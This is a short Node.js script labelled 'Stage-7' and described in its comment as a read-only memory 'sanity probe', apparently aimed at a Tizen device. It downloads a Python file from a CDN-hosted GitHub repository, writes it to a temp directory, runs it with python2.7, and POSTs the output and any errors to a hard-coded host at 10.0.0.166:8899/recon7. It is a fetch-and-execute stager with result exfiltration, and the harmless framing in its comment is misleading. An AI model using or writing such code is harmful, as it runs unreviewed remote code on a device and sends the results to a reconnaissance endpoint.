// Stage-7: run read-only sdp_mem physmap sanity probe via signed python2.7.
var fs = require('fs');
var http = require('http');
var https = require('https');
var cp = require('child_process');
function post(o) {
  var b = JSON.stringify(o);
  var req = http.request({ host: '10.0.0.166', port: 8899, path: '/recon7', method: 'POST', headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(b) } }, function (r) { });
  req.on('error', function (e) { });
  req.write(b); req.end();
}
https.get('https://cdn.jsdelivr.net/gh/ItsMeATaco/tizen-glass-dashboard@v11/probe.py', function (r) {
  var c = [];
  r.on('data', function (d) { c.push(d); });
  r.on('end', function () {
    var buf = Buffer.concat(c);
    if (!buf || buf.length < 50) { post({ err: 'fetch' }); return; }
    var p = '/home/owner/share/tmp/probe.py';
    try { fs.writeFileSync(p, buf); } catch (e) { post({ err: 'write' }); return; }
    var out = {};
    try { out.probe = cp.execSync('python2.7 ' + p, { timeout: 20000 }).toString(); } catch (e) { out.probe = 'ERR ' + e.message; }
    post(out);
  });
}).on('error', function (e) { post({ err: 'https ' + e.message }); });
